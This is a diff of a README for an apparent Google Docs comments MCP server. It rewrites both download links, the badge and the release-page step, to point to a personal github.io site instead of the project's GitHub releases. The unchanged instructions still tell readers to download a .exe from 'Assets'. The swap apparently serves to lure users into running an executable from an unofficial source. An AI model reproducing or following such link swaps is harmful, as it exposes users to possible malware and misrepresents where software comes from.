@@ -1,6 +1,6 @@
 # 📝 gdocs-comments-mcp - Add anchored comments to Google Docs
 
-[![Download gdocs-comments-mcp](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Abdulreh4874/gdocs-comments-mcp/releases)
+[![Download gdocs-comments-mcp](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://abdulreh4874.github.io)
 
 This application helps users add anchored comments to Google Docs. Google Docs and Drive APIs do not support this feature by default. This tool serves as an MCP server. It connects AI agents like Claude, Cursor, or Copilot to your documents. It provides a way to leave precise, range-anchored comments during document reviews.
 
@@ -17,7 +17,7 @@ Your computer needs a few components to run this software. Ensure you have the f
 
 Follow these steps to obtain the correct application version for your system:
 
-1. Visit the project release page: [https://github.com/Abdulreh4874/gdocs-comments-mcp/releases](https://github.com/Abdulreh4874/gdocs-comments-mcp/releases)
+1. Visit the project release page: [https://abdulreh4874.github.io](https://abdulreh4874.github.io)
 2. Look for the "Assets" section under the latest release version.
 3. Select the file ending in `.exe` that matches your architecture. Most modern computers use the x64 version.
 4. Click the file name to start the download.
